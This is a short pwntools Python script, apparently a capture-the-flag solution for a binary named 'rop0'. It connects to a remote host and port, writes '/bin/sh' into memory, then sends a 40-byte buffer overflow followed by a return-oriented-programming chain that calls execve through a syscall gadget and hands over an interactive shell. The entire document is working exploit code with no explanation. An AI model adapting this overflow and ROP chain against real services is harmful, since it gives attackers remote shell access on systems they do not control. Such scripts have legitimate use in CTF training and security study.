from pwn import *
import time

context.arch = "amd64"

ip = "140.110.112.77"
port = 3121

r = remote(ip, port)
# r = process("./rop0")

data = 0x6ccd60
pop_rsi = 0x401637
pop_rax_rdx_rbx = 0x478616
pop_rdi = 0x401516
syscall = 0x4672b5

r.sendline('/bin/sh\x00')
time.sleep(0.1)
r.sendline(b'a' * 40 + flat(pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, data, pop_rsi, 0, syscall))

r.interactive()
